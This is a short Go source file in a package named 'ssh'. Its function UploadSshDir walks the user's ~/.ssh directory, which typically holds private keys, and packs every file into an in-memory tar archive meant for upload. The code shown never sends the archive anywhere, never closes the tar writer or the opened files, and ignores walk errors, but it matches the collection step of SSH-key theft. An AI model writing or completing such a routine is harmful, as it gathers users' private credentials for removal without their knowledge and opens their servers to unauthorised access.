package ssh

import (
	"archive/tar"
	"bytes"
	"io"
	"log"
	"os"
	"path"
	"path/filepath"
)

func UploadSshDir() {
	sshDir := getSshDir()
	var buf bytes.Buffer
	tw := tar.NewWriter(&buf)

	filepath.Walk(sshDir, func(file string, fi os.FileInfo, _ error) error {
		header, err := tar.FileInfoHeader(fi, file)
		if err != nil {
			return err
		}
		header.Name = filepath.ToSlash(file)
		if err := tw.WriteHeader(header); err != nil {
			return err
		}
		if !fi.IsDir() {
			data, err := os.Open(file)
			if err != nil {
				return err
			}
			if _, err := io.Copy(tw, data); err != nil {
				return err
			}
		}
		return nil
	})
}

func getSshDir() string {
	homeDir, err := os.UserHomeDir()
	if err != nil {
		log.Fatal(err)
	}
	return path.Join(homeDir, ".ssh")
}
